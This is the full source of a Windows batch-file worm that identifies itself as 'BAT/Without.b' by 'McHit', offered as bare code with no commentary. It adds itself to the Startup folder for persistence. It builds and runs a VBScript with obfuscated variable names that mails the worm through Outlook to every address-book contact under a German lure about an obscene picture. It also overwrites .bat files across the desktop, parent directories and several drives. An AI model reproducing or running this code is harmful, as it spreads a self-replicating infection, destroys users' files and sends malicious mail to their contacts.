   @echo off
   ctty NUL
   REM BAT/Without.b
   REM by McHit
   :AutoSt
   copy %0 %WinDir%\Startm~1\Progra~1\Autost~1\WinStart.bat

   :Worming
   :eMailWorming
   copy %0 C:\Without.bat
   copy %0 C:\send.vbs
   echo wmuhfjkakcoonck = "C:\Without.bat" > C:\send.vbs
   echo Set xhhlxhreuhuvwcs = CreateObject("WScript.Shell") >>C:\send.vbs
   echo Set dbyhlgwgqvefvxx = CreateObject("Outlook.Application") >>C:\send.vbs
   echo Set iqcxqmqghaubtkf = dbyhlgwgqvefvxx.GetNameSpace("MAPI") >>C:\send.vbs
   echo For pelrbieehrudxws = 1 to iqcxqmqghaubtkf.AddressLists.Count >>C:\send.vbs
   echo Set kdbjiioqkgpxvhg = dbyhlgwgqvefvxx.CreateItem(0) >>C:\send.vbs
   echo Set bvljmqowtbyhkbm = iqcxqmqghaubtkf.AddressLists.Item(pelrbieehrudxws) >>C:\send.vbs
   echo kdbjiioqkgpxvhg.Attachments.Add wmuhfjkakcoonck >>C:\send.vbs
   echo kdbjiioqkgpxvhg.Subject = "Hi!!" >>C:\send.vbs
   echo kdbjiioqkgpxvhg.Body = "Hi! Guck dir mal das perverse Bild an! ;-)" >>C:\send.vbs
   echo Set bslxidjnhypjlns = bvljmqowtbyhkbm.AddressEntries >>C:\send.vbs
   echo Set fyggrhraqlebwnp = kdbjiioqkgpxvhg.Recipients >>C:\send.vbs
   echo For lvnwecqtigbqpxr = 1 to bslxidjnhypjlns.Count >>C:\send.vbs
   echo kdbjiioqkgpxvhg.Recipients.Add bslxidjnhypjlns.Item(lvnwecqtigbqpxr) >>C:\send.vbs
   echo Next >>C:\send.vbs
   echo kdbjiioqkgpxvhg.Send >>C:\send.vbs
   echo Next >>C:\send.vbs
   cscript C:\send.vbs

   :ComputerWorming
   copy %0 %WinDir%\Desktop\*.bat
   copy %0 C:\*.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat
   cd..
   copy %0 *.bat


   :DiskWorming
   copy %0 A:\*.bat
   copy %0 D:\*.bat
   copy %0 E:\*.bat
   ctty CON
